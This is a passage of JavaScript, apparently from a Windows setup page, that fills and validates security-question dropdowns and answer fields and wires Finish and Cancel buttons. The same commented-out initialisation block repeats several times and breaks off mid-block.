            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
